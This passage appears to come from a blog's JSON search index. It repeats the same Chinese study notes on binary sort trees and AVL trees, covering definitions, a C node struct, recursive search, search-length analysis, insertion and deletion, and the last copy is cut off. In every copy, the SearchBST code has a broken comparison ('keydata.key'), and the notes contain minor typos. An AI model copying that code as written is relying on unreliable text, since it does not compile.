(1)若其左子树非空，则左子树上所有结点的值均小于根结点的值 (2)若其右子树非空，则右子树上所有结点的值均大于等于根结点的值 (3)其左右子树本身又各是一棵二叉排序树 性质中序遍历非空的二叉排序树所得到的数据元素序列是一个按关键字排列的递增有序序列。 存储结构 typedef struct{ KeyType key; //关键字项 InfoType otherinfo; //其他数据域 }ElemType; typedef struct BSTNode{ ElemType data; //数据域 struct BSTNode *Lchild,*rchild; //左右孩子指针 }BSTNode,*BSTree 算法实现（递归） BSTree SearchBST(BSTree T,KeyType key){ if((!T)||key==T-\u003edata.key) return T; else if(keydata.key) return SearchBST(T-\u003eLchild,key); else return SearchBST(T-\u003erchild,key); }//SearchBST 性能分析二又排序树上查找某关键字等于给定值的结点过程，其实就是走了一条从根到该结点的路径。 比较的关键字次数=此节点所在层数 最多的比较次数=树的深度 平均查找长度 含有n个结点的二叉排序树的平均查找长度和树的形态有关 最好情况： 初始序列{45,24,53,12,37,93)，ASL=log2 (n + 1) - 1；树的深度为:⌊log2 n⌋+ 1；与折半查找中的判定树相同。(形态比较均): O (log2 n)1 最坏情况： 初始序列{12,24,37,45,53,93}插入的n个元素从一开始就有序，——变成单支树的形态！此时树的深度为n，ASL=(n+ 1)/2查找效率与顺序查找情况相同：O(n) 操作\r插入插入的元素一定在叶节点上 生成一个无序序列可通过构造二叉排序树而变成一个有序序列。构造树的过程就是对无序序列进行排序的过程。 插入的结点均为叶子结点，故无需移动其他节点。相当于在有序序列插入记录而无需移动其他记录。 关键字输入顺序不同，建立的不同二叉排序树。 删除要保证删除后所得的二叉树仍满足二叉排序树的性质不变。 将因删除结点而断开的二叉链表重新连接起来 防止重新链接后树的高度增加 （1）被删除的结点是叶子结点：直接删去该结点。 （2）被删除的结点只有左子树或者只有右子树，用其左子树或者右子树替换它 (结点替换)。 其双亲结点的相应指针域的值改为“指向被删除结点的左子树或右子树”。 （3）被删除的结点既有左子树，也有右子树。 以其中序前趋值替换之（值替换），然后再删除该前趋结点。前趋时左子树中最大的结点。 也可以用其后继替换之，然后再删除该后继节点。后继是右子树中最小的结点。 平衡二叉树Balanced Binary Tree，又称AVL树 一棵平衡二叉树或者是空树，或者是具有下列性质的二叉排序树： 左子树与右子树的高度之差的绝对值小于等于1； 左子树和右子树也是平衡二叉树。 为计算方便，给每个结点附加一个数字，给出该结点左子树与右子树的高度差。这个数字称为结点的平衡因子（BF）。 平衡因子=结点左子树的高度-结点右子树的高度 对于一棵有n个结点的AVL树，其高度保持在O(log2 n)数量级，ASL保持在O(log2 n)量级 分析与调整如果在一棵AVL树中插入一个新结点后造成失衡，则必须重新调整树的结构，使之恢复平衡。 平衡调整的四种类型： A：失衡结点 不止一个失衡结点时，为最小失衡子树的根结点 B：A结点的孩子，C结点的双亲 C：插入新结点的子树 调整原则： ①降低高度 ②保持二叉排序树性质 ","date":"2023-12-19","objectID":"/data_structure_notes/:7:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#定义"},{"categories":["notice"],"content":"\r树表的查找\r二叉排序树Binary Sort Tree，又称为二叉搜索树、二叉查找树 定义二叉排序树或是空树，或是满足如下性质的二叉树： (1)若其左子树非空，则左子树上所有结点的值均小于根结点的值 (2)若其右子树非空，则右子树上所有结点的值均大于等于根结点的值 (3)其左右子树本身又各是一棵二叉排序树 性质中序遍历非空的二叉排序树所得到的数据元素序列是一个按关键字排列的递增有序序列。 存储结构 typedef struct{ KeyType key; //关键字项 InfoType otherinfo; //其他数据域 }ElemType; typedef struct BSTNode{ ElemType data; //数据域 struct BSTNode *Lchild,*rchild; //左右孩子指针 }BSTNode,*BSTree 算法实现（递归） BSTree SearchBST(BSTree T,KeyType key){ if((!T)||key==T-\u003edata.key) return T; else if(keydata.key) return SearchBST(T-\u003eLchild,key); else return SearchBST(T-\u003erchild,key); }//SearchBST 性能分析二又排序树上查找某关键字等于给定值的结点过程，其实就是走了一条从根到该结点的路径。 比较的关键字次数=此节点所在层数 最多的比较次数=树的深度 平均查找长度 含有n个结点的二叉排序树的平均查找长度和树的形态有关 最好情况： 初始序列{45,24,53,12,37,93)，ASL=log2 (n + 1) - 1；树的深度为:⌊log2 n⌋+ 1；与折半查找中的判定树相同。(形态比较均): O (log2 n)1 最坏情况： 初始序列{12,24,37,45,53,93}插入的n个元素从一开始就有序，——变成单支树的形态！此时树的深度为n，ASL=(n+ 1)/2查找效率与顺序查找情况相同：O(n) 操作\r插入插入的元素一定在叶节点上 生成一个无序序列可通过构造二叉排序树而变成一个有序序列。构造树的过程就是对无序序列进行排序的过程。 插入的结点均为叶子结点，故无需移动其他节点。相当于在有序序列插入记录而无需移动其他记录。 关键字输入顺序不同，建立的不同二叉排序树。 删除要保证删除后所得的二叉树仍满足二叉排序树的性质不变。 将因删除结点而断开的二叉链表重新连接起来 防止重新链接后树的高度增加 （1）被删除的结点是叶子结点：直接删去该结点。 （2）被删除的结点只有左子树或者只有右子树，用其左子树或者右子树替换它 (结点替换)。 其双亲结点的相应指针域的值改为“指向被删除结点的左子树或右子树”。 （3）被删除的结点既有左子树，也有右子树。 以其中序前趋值替换之（值替换），然后再删除该前趋结点。前趋时左子树中最大的结点。 也可以用其后继替换之，然后再删除该后继节点。后继是右子树中最小的结点。 平衡二叉树Balanced Binary Tree，又称AVL树 一棵平衡二叉树或者是空树，或者是具有下列性质的二叉排序树： 左子树与右子树的高度之差的绝对值小于等于1； 左子树和右子树也是平衡二叉树。 为计算方便，给每个结点附加一个数字，给出该结点左子树与右子树的高度差。这个数字称为结点的平衡因子（BF）。 平衡因子=结点左子树的高度-结点右子树的高度 对于一棵有n个结点的AVL树，其高度保持在O(log2 n)数量级，ASL保持在O(log2 n)量级 分析与调整如果在一棵AVL树中插入一个新结点后造成失衡，则必须重新调整树的结构，使之恢复平衡。 平衡调整的四种类型： A：失衡结点 不止一个失衡结点时，为最小失衡子树的根结点 B：A结点的孩子，C结点的双亲 C：插入新结点的子树 调整原则： ①降低高度 ②保持二叉排序树性质 ","date":"2023-12-19","objectID":"/data_structure_notes/:7:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#性质"},{"categories":["notice"],"content":"\r树表的查找\r二叉排序树Binary Sort Tree，又称为二叉搜索树、二叉查找树 定义二叉排序树或是空树，或是满足如下性质的二叉树： (1)若其左子树非空，则左子树上所有结点的值均小于根结点的值 (2)若其右子树非空，则右子树上所有结点的值均大于等于根结点的值 (3)其左右子树本身又各是一棵二叉排序树 性质中序遍历非空的二叉排序树所得到的数据元素序列是一个按关键字排列的递增有序序列。 存储结构 typedef struct{ KeyType key; //关键字项 InfoType otherinfo; //其他数据域 }ElemType; typedef struct BSTNode{ ElemType data; //数据域 struct BSTNode *Lchild,*rchild; //左右孩子指针 }BSTNode,*BSTree 算法实现（递归） BSTree SearchBST(BSTree T,KeyType key){ if((!T)||key==T-\u003edata.key) return T; else if(keydata.key) return SearchBST(T-\u003eLchild,key); else return SearchBST(T-\u003erchild,key); }//SearchBST 性能分析二又排序树上查找某关键字等于给定值的结点过程，其实就是走了一条从根到该结点的路径。 比较的关键字次数=此节点所在层数 最多的比较次数=树的深度 平均查找长度 含有n个结点的二叉排序树的平均查找长度和树的形态有关 最好情况： 初始序列{45,24,53,12,37,93)，ASL=log2 (n + 1) - 1；树的深度为:⌊log2 n⌋+ 1；与折半查找中的判定树相同。(形态比较均): O (log2 n)1 最坏情况： 初始序列{12,24,37,45,53,93}插入的n个元素从一开始就有序，——变成单支树的形态！此时树的深度为n，ASL=(n+ 1)/2查找效率与顺序查找情况相同：O(n) 操作\r插入插入的元素一定在叶节点上 生成一个无序序列可通过构造二叉排序树而变成一个有序序列。构造树的过程就是对无序序列进行排序的过程。 插入的结点均为叶子结点，故无需移动其他节点。相当于在有序序列插入记录而无需移动其他记录。 关键字输入顺序不同，建立的不同二叉排序树。 删除要保证删除后所得的二叉树仍满足二叉排序树的性质不变。 将因删除结点而断开的二叉链表重新连接起来 防止重新链接后树的高度增加 （1）被删除的结点是叶子结点：直接删去该结点。 （2）被删除的结点只有左子树或者只有右子树，用其左子树或者右子树替换它 (结点替换)。 其双亲结点的相应指针域的值改为“指向被删除结点的左子树或右子树”。 （3）被删除的结点既有左子树，也有右子树。 以其中序前趋值替换之（值替换），然后再删除该前趋结点。前趋时左子树中最大的结点。 也可以用其后继替换之，然后再删除该后继节点。后继是右子树中最小的结点。 平衡二叉树Balanced Binary Tree，又称AVL树 一棵平衡二叉树或者是空树，或者是具有下列性质的二叉排序树： 左子树与右子树的高度之差的绝对值小于等于1； 左子树和右子树也是平衡二叉树。 为计算方便，给每个结点附加一个数字，给出该结点左子树与右子树的高度差。这个数字称为结点的平衡因子（BF）。 平衡因子=结点左子树的高度-结点右子树的高度 对于一棵有n个结点的AVL树，其高度保持在O(log2 n)数量级，ASL保持在O(log2 n)量级 分析与调整如果在一棵AVL树中插入一个新结点后造成失衡，则必须重新调整树的结构，使之恢复平衡。 平衡调整的四种类型： A：失衡结点 不止一个失衡结点时，为最小失衡子树的根结点 B：A结点的孩子，C结点的双亲 C：插入新结点的子树 调整原则： ①降低高度 ②保持二叉排序树性质 ","date":"2023-12-19","objectID":"/data_structure_notes/:7:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#存储结构"},{"categories":["notice"],"content":"\r树表的查找\r二叉排序树Binary Sort Tree，又称为二叉搜索树、二叉查找树 定义二叉排序树或是空树，或是满足如下性质的二叉树： (1)若其左子树非空，则左子树上所有结点的值均小于根结点的值 (2)若其右子树非空，则右子树上所有结点的值均大于等于根结点的值 (3)其左右子树本身又各是一棵二叉排序树 性质中序遍历非空的二叉排序树所得到的数据元素序列是一个按关键字排列的递增有序序列。 存储结构 typedef struct{ KeyType key; //关键字项 InfoType otherinfo; //其他数据域 }ElemType; typedef struct BSTNode{ ElemType data; //数据域 struct BSTNode *Lchild,*rchild; //左右孩子指针 }BSTNode,*BSTree 算法实现（递归） BSTree SearchBST(BSTree T,KeyType key){ if((!T)||key==T-\u003edata.key) return T; else if(keydata.key) return SearchBST(T-\u003eLchild,key); else return SearchBST(T-\u003erchild,key); }//SearchBST 性能分析二又排序树上查找某关键字等于给定值的结点过程，其实就是走了一条从根到该结点的路径。 比较的关键字次数=此节点所在层数 最多的比较次数=树的深度 平均查找长度 含有n个结点的二叉排序树的平均查找长度和树的形态有关 最好情况： 初始序列{45,24,53,12,37,93)，ASL=log2 (n + 1) - 1；树的深度为:⌊log2 n⌋+ 1；与折半查找中的判定树相同。(形态比较均): O (log2 n)1 最坏情况： 初始序列{12,24,37,45,53,93}插入的n个元素从一开始就有序，——变成单支树的形态！此时树的深度为n，ASL=(n+ 1)/2查找效率与顺序查找情况相同：O(n) 操作\r插入插入的元素一定在叶节点上 生成一个无序序列可通过构造二叉排序树而变成一个有序序列。构造树的过程就是对无序序列进行排序的过程。 插入的结点均为叶子结点，故无需移动其他节点。相当于在有序序列插入记录而无需移动其他记录。 关键字输入顺序不同，建立的不同二叉排序树。 删除要保证删除后所得的二叉树仍满足二叉排序树的性质不变。 将因删除结点而断开的二叉链表重新连接起来 防止重新链接后树的高度增加 （1）被删除的结点是叶子结点：直接删去该结点。 （2）被删除的结点只有左子树或者只有右子树，用其左子树或者右子树替换它 (结点替换)。 其双亲结点的相应指针域的值改为“指向被删除结点的左子树或右子树”。 （3）被删除的结点既有左子树，也有右子树。 以其中序前趋值替换之（值替换），然后再删除该前趋结点。前趋时左子树中最大的结点。 也可以用其后继替换之，然后再删除该后继节点。后继是右子树中最小的结点。 平衡二叉树Balanced Binary Tree，又称AVL树 一棵平衡二叉树或者是空树，或者是具有下列性质的二叉排序树： 左子树与右子树的高度之差的绝对值小于等于1； 左子树和右子树也是平衡二叉树。 为计算方便，给每个结点附加一个数字，给出该结点左子树与右子树的高度差。这个数字称为结点的平衡因子（BF）。 平衡因子=结点左子树的高度-结点右子树的高度 对于一棵有n个结点的AVL树，其高度保持在O(log2 n)数量级，ASL保持在O(log2 n)量级 分析与调整如果在一棵AVL树中插入一个新结点后造成失衡，则必须重新调整树的结构，使之恢复平衡。 平衡调整的四种类型： A：失衡结点 不止一个失衡结点时，为最小失衡子树的根结点 B：A结点的孩子，C结点的双亲 C：插入新结点的子树 调整原则： ①降低高度 ②保持二叉排序树性质 ","date":"2023-12-19","objectID":"/data_structure_notes/:7:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#算法实现-3"},{"categories":["notice"],"content":"\r树表的查找\r二叉排序树Binary Sort Tree，又称为二叉搜索树、二叉查找树 定义二叉排序树或是空树，或是满足如下性质的二叉树： (1)若其左子树非空，则左子树上所有结点的值均小于根结点的值 (2)若其右子树非空，则右子树上所有结点的值均大于等于根结点的值 (3)其左右子树本身又各是一棵二叉排序树 性质中序遍历非空的二叉排序树所得到的数据元素序列是一个按关键字排列的递增有序序列。 存储结构 typedef struct{ KeyType key; //关键字项 InfoType otherinfo; //其他数据域 }ElemType; typedef struct BSTNode{ ElemType data; //数据域 struct BSTNode *Lchild,*rchild; //左右孩子指针 }BSTNode,*BSTree 算法实现（递归） BSTree SearchBST(BSTree T,KeyType key){ if((!T)||key==T-\u003edata.key) return T; else if(keydata.key) return SearchBST(T-\u003eLchild,key); else return SearchBST(T-\u003erchild,key); }//SearchBST 性能分析二又排序树上查找某关键字等于给定值的结点过程，其实就是走了一条从根到该结点的路径。 比较的关键字次数=此节点所在层数 最多的比较次数=树的深度 平均查找长度 含有n个结点的二叉排序树的平均查找长度和树的形态有关 最好情况： 初始序列{45,24,53,12,37,93)，ASL=log2 (n + 1) - 1；树的深度为:⌊log2 n⌋+ 1；与折半查找中的判定树相同。(形态比较均): O (log2 n)1 最坏情况： 初始序列{12,24,37,45,53,93}插入的n个元素从一开始就有序，——变成单支树的形态！此时树的深度为n，ASL=(n+ 1)/2查找效率与顺序查找情况相同：O(n) 操作\r插入插入的元素一定在叶节点上 生成一个无序序列可通过构造二叉排序树而变成一个有序序列。构造树的过程就是对无序序列进行排序的过程。 插入的结点均为叶子结点，故无需移动其他节点。相当于在有序序列插入记录而无需移动其他记录。 关键字输入顺序不同，建立的不同二叉排序树。 删除要保证删除后所得的二叉树仍满足二叉排序树的性质不变。 将因删除结点而断开的二叉链表重新连接起来 防止重新链接后树的高度增加 （1）被删除的结点是叶子结点：直接删去该结点。 （2）被删除的结点只有左子树或者只有右子树，用其左子树或者右子树替换它 (结点替换)。 其双亲结点的相应指针域的值改为“指向被删除结点的左子树或右子树”。 （3）被删除的结点既有左子树，也有右子树。 以其中序前趋值替换之（值替换），然后再删除该前趋结点。前趋时左子树中最大的结点。 也可以用其后继替换之，然后再删除该后继节点。后继是右子树中最小的结点。 平衡二叉树Balanced Binary Tree，又称AVL树 一棵平衡二叉树或者是空树，或者是具有下列性质的二叉排序树： 左子树与右子树的高度之差的绝对值小于等于1； 左子树和右子树也是平衡二叉树。 为计算方便，给每个结点附加一个数字，给出该结点左子树与右子树的高度差。这个数字称为结点的平衡因子（BF）。 平衡因子=结点左子树的高度-结点右子树的高度 对于一棵有n个结点的AVL树，其高度保持在O(log2 n)数量级，ASL保持在O(log2 n)量级 分析与调整如果在一棵AVL树中插入一个新结点后造成失衡，则必须重新调整树的结构，使之恢复平衡。 平衡调整的四种类型： A：失衡结点 不止一个失衡结点时，为最小失衡子树的根结点 B：A结点的孩子，C结点的双亲 C：插入新结点的子树 调整原则： ①降低高度 ②保持二叉排序树性质 ","date":"2023-12-19","objectID":"/data_structure_notes/:7:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#性能分析-3"},{"categories":["notice"],"content":"\r树表的查找\r二叉排序树Binary Sort Tree，又称为二叉搜索树、二叉查找树 定义二叉排序树或是空树，或是满足如下性质的二叉树： (1)若其左子树非空，则左子树上所有结点的值均小于根结点的值 (2)若其右子树非空，则右子树上所有结点的值均大于等于根结点的值 (3)其左右子树本身又各是一棵二叉排序树 性质中序遍历非空的二叉排序树所得到的数据元素序列是一个按关键字排列的递增有序序列。 存储结构 typedef struct{ KeyType key; //关键字项 InfoType otherinfo; //其他数据域 }ElemType; typedef struct BSTNode{ ElemType data; //数据域 struct BSTNode *Lchild,*rchild; //左右孩子指针 }BSTNode,*BSTree 算法实现（递归） BSTree SearchBST(BSTree T,KeyType key){ if((!T)||key==T-\u003edata.key) return T; else if(keydata.key) return SearchBST(T-\u003eLchild,key); else return SearchBST(T-\u003erchild,key); }//SearchBST 性能分析二又排序树上查找某关键字等于给定值的结点过程，其实就是走了一条从根到该结点的路径。 比较的关键字次数=此节点所在层数 最多的比较次数=树的深度 平均查找长度 含有n个结点的二叉排序树的平均查找长度和树的形态有关 最好情况： 初始序列{45,24,53,12,37,93)，ASL=log2 (n + 1) - 1；树的深度为:⌊log2 n⌋+ 1；与折半查找中的判定树相同。(形态比较均): O (log2 n)1 最坏情况： 初始序列{12,24,37,45,53,93}插入的n个元素从一开始就有序，——变成单支树的形态！此时树的深度为n，ASL=(n+ 1)/2查找效率与顺序查找情况相同：O(n) 操作\r插入插入的元素一定在叶节点上 生成一个无序序列可通过构造二叉排序树而变成一个有序序列。构造树的过程就是对无序序列进行排序的过程。 插入的结点均为叶子结点，故无需移动其他节点。相当于在有序序列插入记录而无需移动其他记录。 关键字输入顺序不同，建立的不同二叉排序树。 删除要保证删除后所得的二叉树仍满足二叉排序树的性质不变。 将因删除结点而断开的二叉链表重新连接起来 防止重新链接后树的高度增加 （1）被删除的结点是叶子结点：直接删去该结点。 （2）被删除的结点只有左子树或者只有右子树，用其左子树或者右子树替换它 (结点替换)。 其双亲结点的相应指针域的值改为“指向被删除结点的左子树或右子树”。 （3）被删除的结点既有左子树，也有右子树。 以其中序前趋值替换之（值替换），然后再删除该前趋结点。前趋时左子树中最大的结点。 也可以用其后继替换之，然后再删除该后继节点。后继是右子树中最小的结点。 平衡二叉树Balanced Binary Tree，又称AVL树 一棵平衡二叉树或者是空树，或者是具有下列性质的二叉排序树： 左子树与右子树的高度之差的绝对值小于等于1； 左子树和右子树也是平衡二叉树。 为计算方便，给每个结点附加一个数字，给出该结点左子树与右子树的高度差。这个数字称为结点的平衡因子（BF）。 平衡因子=结点左子树的高度-结点右子树的高度 对于一棵有n个结点的AVL树，其高度保持在O(log2 n)数量级，ASL保持在O(log2 n)量级 分析与调整如果在一棵AVL树中插入一个新结点后造成失衡，则必须重新调整树的结构，使之恢复平衡。 平衡调整的四种类型： A：失衡结点 不止一个失衡结点时，为最小失衡子树的根结点 B：A结点的孩子，C结点的双亲 C：插入新结点的子树 调整原则： ①降低高度 ②保持二叉排序树性质 ","date":"2023-12-19","objectID":"/data_structure_notes/:7:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#操作"},{"categories":["notice"],"content":"\r树表的查找\r二叉排序树Binary Sort Tree，又称为二叉搜索树、二叉查找树 定义二叉排序树或是空树，或是满足如下性质的二叉树： (1)若其左子树非空，则左子树上所有结点的值均小于根结点的值 (2)若其右子树非空，则右子树上所有结点的值均大于等于根结点的值 (3)其左右子树本身又各是一棵二叉排序树 性质中序遍历非空的二叉排序树所得到的数据元素序列是一个按关键字排列的递增有序序列。 存储结构 typedef struct{ KeyType key; //关键字项 InfoType otherinfo; //其他数据域 }ElemType; typedef struct BSTNode{ ElemType data; //数据域 struct BSTNode *Lchild,*rchild; //左右孩子指针 }BSTNode,*BSTree 算法实现（递归） BSTree SearchBST(BSTree T,KeyType key){ if((!T)||key==T-\u003edata.key) return T; else if(keydata.key) return SearchBST(T-\u003eLchild,key); else return SearchBST(T-\u003erchild,key); }//SearchBST 性能分析二又排序树上查找某关键字等于给定值的结点过程，其实就是走了一条从根到该结点的路径。 比较的关键字次数=此节点所在层数 最多的比较次数=树的深度 平均查找长度 含有n个结点的二叉排序树的平均查找长度和树的形态有关 最好情况： 初始序列{45,24,53,12,37,93)，ASL=log2 (n + 1) - 1；树的深度为:⌊log2 n⌋+ 1；与折半查找中的判定树相同。(形态比较均): O (log2 n)1 最坏情况： 初始序列{12,24,37,45,53,93}插入的n个元素从一开始就有序，——变成单支树的形态！此时树的深度为n，ASL=(n+ 1)/2查找效率与顺序查找情况相同：O(n) 操作\r插入插入的元素一定在叶节点上 生成一个无序序列可通过构造二叉排序树而变成一个有序序列。构造树的过程就是对无序序列进行排序的过程。 插入的结点均为叶子结点，故无需移动其他节点。相当于在有序序列插入记录而无需移动其他记录。 关键字输入顺序不同，建立的不同二叉排序树。 删除要保证删除后所得的二叉树仍满足二叉排序树的性质不变。 将因删除结点而断开的二叉链表重新连接起来 防止重新链接后树的高度增加 （1）被删除的结点是叶子结点：直接删去该结点。 （2）被删除的结点只有左子树或者只有右子树，用其左子树或者右子树替换它 (结点替换)。 其双亲结点的相应指针域的值改为“指向被删除结点的左子树或右子树”。 （3）被删除的结点既有左子树，也有右子树。 以其中序前趋值替换之（值替换），然后再删除该前趋结点。前趋时左子树中最大的结点。 也可以用其后继替换之，然后再删除该后继节点。后继是右子树中最小的结点。 平衡二叉树Balanced Binary Tree，又称AVL树 一棵平衡二叉树或者是空树，或者是具有下列性质的二叉排序树： 左子树与右子树的高度之差的绝对值小于等于1； 左子树和右子树也是平衡二叉树。 为计算方便，给每个结点附加一个数字，给出该结点左子树与右子树的高度差。这个数字称为结点的平衡因子（BF）。 平衡因子=结点左子树的高度-结点右子树的高度 对于一棵有n个结点的AVL树，其高度保持在O(log2 n)数量级，ASL保持在O(log2 n)量级 分析与调整如果在一棵AVL树中插入一个新结点后造成失衡，则必须重新调整树的结构，使之恢复平衡。 平衡调整的四种类型： A：失衡结点 不止一个失衡结点时，为最小失衡子树的根结点 B：A结点的孩子，C结点的双亲 C：插入新结点的子树 调整原则： ①降低高度 ②保持二叉排序树性质 ","date":"2023-12-19","objectID":"/data_structure_notes/:7:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#插入"},{"categories":["notice"],"content":"\r树表的查找\r二叉排序树Binary Sort Tree，又称为二叉搜索树、二叉查找树 定义二叉排序树或是空树，或是满足如下性质的二叉树： (1)若其左子树非空，则左子树上所有结点的值均小于根结点的值 (2)若其右子树非空，则右子树上所有结点的值均大于等于根结点的值 (3)其左右子树本身又各是一棵二叉排序树 性质中序遍历非空的二叉排序树所得到的数据元素序列是一个按关键字排列的递增有序序列。 存储结构 typedef struct{ KeyType key; //关键字项 InfoType otherinfo; //其他数据域 }ElemType; typedef struct BSTNode{ ElemType data; //数据域 struct BSTNode *Lchild,*rchild; //左右孩子指针 }BSTNode,*BSTree 算法实现（递归） BSTree SearchBST(BSTree T,KeyType key){ if((!T)||key==T-\u003edata.key) return T; else if(keydata.key) return SearchBST(T-\u003eLchild,key); else return SearchBST(T-\u003erchild,key); }//SearchBST 性能分析二又排序树上查找某关键字等于给定值的结点过程，其实就是走了一条从根到该结点的路径。 比较的关键字次数=此节点所在层数 最多的比较次数=树的深度 平均查找长度 含有n个结点的二叉排序树的平均查找长度和树的形态有关 最好情况： 初始序列{45,24,53,12,37,93)，ASL=log2 (n + 1) - 1；树的深度为:⌊log2 n⌋+ 1；与折半查找中的判定树相同。(形态比较均): O (log2 n)1 最坏情况： 初始序列{12,24,37,45,53,93}插入的n个元素从一开始就有序，——变成单支树的形态！此时树的深度为n，ASL=(n+ 1)/2查找效率与顺序查找情况相同：O(n) 操作\r插入插入的元素一定在叶节点上 生成一个无序序列可通过构造二叉排序树而变成一个有序序列。构造树的过程就是对无序序列进行排序的过程。 插入的结点均为叶子结点，故无需移动其他节点。相当于在有序序列插入记录而无需移动其他记录。 关键字输入顺序不同，建立的不同二叉排序树。 删除要保证删除后所得的二叉树仍满足二叉排序树的性质不变。 将因删除结点而断开的二叉链表重新连接起来 防止重新链接后树的高度增加 （1）被删除的结点是叶子结点：直接删去该结点。 （2）被删除的结点只有左子树或者只有右子树，用其左子树或者右子树替换它 (结点替换)。 其双亲结点的相应指针域的值改为“指向被删除结点的左子树或右子树”。 （3）被删除的结点既有左子树，也有右子树。 以其中序前趋值替换之（值替换），然后再删除该前趋结点。前趋时左子树中最大的结点。 也可以用其后继替换之，然后再删除该后继节点。后继是右子树中最小的结点。 平衡二叉树Balanced Binary Tree，又称AVL树 一棵平衡二叉树或者是空树，或者是具有下列性质的二叉排序树： 左子树与右子树的高度之差的绝对值小于等于1； 左子树和右子树也是平衡二叉树。 为计算方便，给每个结点附加一个数字，给出该结点左子树与右子树的高度差。这个数字称为结点的平衡因子（BF）。 平衡因子=结点左子树的高度-结点右子树的高度 对于一棵有n个结点的AVL树，其高度保持在O(log2 n)数量级，ASL保持在O(log2 n)量级 分析与调整如果在一棵AVL树中插入一个新结点后造成失衡，则必须重新调整树的结构，使之恢复平衡。 平衡调整的四种类型： A：失衡结点 不止一个失衡结点时，为最小失衡子树的根结点 B：A结点的孩子，C结点的双亲 C：插入新结点的子树 调整原则： ①降低高度 ②保持二叉排序树性质 ","date":"2023-12-19","objectID":"/data_structure_notes/:7:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#生成"},{"categories":["notice"],"content":"\r树表的查找\r二叉排序树Binary Sort Tree，又称为二叉搜索树、二叉查找树 定义二叉排序树或是空树，或是满足如下性质的二叉树： (1)若其左子树非空，则左子树上所有结点的值均小于根结点的值 (2)若其右子树非空，则右子树上所有结点的值均大于等于根结点的值 (3)其左右子树本身又各是一棵二叉排序树 性质中序遍历非空的二叉排序树所得到的数据元素序列是一个按关键字排列的递增有序序列。 存储结构 typedef struct{ KeyType key; //关键字项 InfoType otherinfo; //其他数据域 }ElemType; typedef struct BSTNode{ ElemType data; //数据域 struct BSTNode *Lchild,*rchild; //左右孩子指针 }BSTNode,*BSTree 算法实现（递归） BSTree SearchBST(BSTree T,KeyType key){ if((!T)||key==T-\u003edata.key) return T; else if(keydata.key) return SearchBST(T-\u003eLchild,key); else return SearchBST(T-\u003erchild,key); }//SearchBST 性能分析二又排序树上查找某关键字等于给定值的结点过程，其实就是走了一条从根到该结点的路径。 比较的关键字次数=此节点所在层数 最多的比较次数=树的深度 平均查找长度 含有n个结点的二叉排序树的平均查找长度和树的形态有关 最好情况： 初始序列{45,24,53,12,37,93)，ASL=log2 (n + 1) - 1；树的深度为:⌊log2 n⌋+ 1；与折半查找中的判定树相同。(形态比较均): O (log2 n)1 最坏情况： 初始序列{12,24,37,45,53,93}插入的n个元素从一开始就有序，——变成单支树的形态！此时树的深度为n，ASL=(n+ 1)/2查找效率与顺序查找情况相同：O(n) 操作\r插入插入的元素一定在叶节点上 生成一个无序序列可通过构造二叉排序树而变成一个有序序列。构造树的过程就是对无序序列进行排序的过程。 插入的结点均为叶子结点，故无需移动其他节点。相当于在有序序列插入记录而无需移动其他记录。 关键字输入顺序不同，建立的不同二叉排序树。 删除要保证删除后所得的二叉树仍满足二叉排序树的性质不变。 将因删除结点而断开的二叉链表重新连接起来 防止重新链接后树的高度增加 （1）被删除的结点是叶子结点：直接删去该结点。 （2）被删除的结点只有左子树或者只有右子树，用其左子树或者右子树替换它 (结点替换)。 其双亲结点的相应指针域的值改为“指向被删除结点的左子树或右子树”。 （3）被删除的结点既有左子树，也有右子树。 以其中序前趋值替换之（值替换），然后再删除该前趋结点。前趋时左子树中最大的结点。 也可以用其后继替换之，然后再删除该后继节点。后继是右子树中最小的结点。 平衡二叉树Balanced Binary Tree，又称AVL树 一棵平衡二叉树或者是空树，或者是具有下列性质的二叉排序树： 左子树与右子树的高度之差的绝对值小于等于1； 左子树和右子树也是平衡二叉树。 为计算方便，给每个结点附加一个数字，给出该结点左子树与右子树的高度差。这个数字称为结点的平衡因子（BF）。 平衡因子=结点左子树的高度-结点右子树的高度 对于一棵有n个结点的AVL树，其高度保持在O(log2 n)数量级，ASL保持在O(log2 n)量级 分析与调整如果在一棵AVL树中插入一个新结点后造成失衡，则必须重新调整树的结构，使之恢复平衡。 平衡调整的四种类型： A：失衡结点 不止一个失衡结点时，为最小失衡子树的根结点 B：A结点的孩子，C结点的双亲 C：插入新结点的子树 调整原则： ①降低高度 ②保持二叉排序树性质 ","date":"2023-12-19","objectID":"/data_structure_notes/:7:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#删除"},{"categories":["notice"],"content":"\r树表的查找\r二叉排序树Binary Sort Tree，又称为二叉搜索树、二叉查找树 定义二叉排序树或是空树，或是满足如下性质的二叉树： (1)若其左子树非空，则左子树上所有结点的值均小于根结点的值 (2)若其右子树非空，则右子树上所有结点的值均大于等于根结点的值 (3)其左右子树本身又各是一棵二叉排序树 性质中序遍历非空的二叉排序树所得到的数据元素序列是一个按关键字排列的递增有序序列。 存储结构 typedef struct{ KeyType key; //关键字项 InfoType otherinfo; //其他数据域 }ElemType; typedef struct BSTNode{ ElemType data; //数据域 struct BSTNode *Lchild,*rchild; //左右孩子指针 }BSTNode,*BSTree 算法实现（递归） BSTree SearchBST(BSTree T,KeyType key){ if((!T)||key==T-\u003edata.key) return T; else if(keydata.key) return SearchBST(T-\u003eLchild,key); else return SearchBST(T-\u003erchild,key); }//SearchBST 性能分析二又排序树上查找某关键字等于给定值的结点过程，其实就是走了一条从根到该结点的路径。 比较的关键字次数=此节点所在层数 最多的比较次数=树的深度 平均查找长度 含有n个结点的二叉排序树的平均查找长度和树的形态有关 最好情况： 初始序列{45,24,53,12,37,93)，ASL=log2 (n + 1) - 1；树的深度为:⌊log2 n⌋+ 1；与折半查找中的判定树相同。(形态比较均): O (log2 n)1 最坏情况： 初始序列{12,24,37,45,53,93}插入的n个元素从一开始就有序，——变成单支树的形态！此时树的深度为n，ASL=(n+ 1)/2查找效率与顺序查找情况相同：O(n) 操作\r插入插入的元素一定在叶节点上 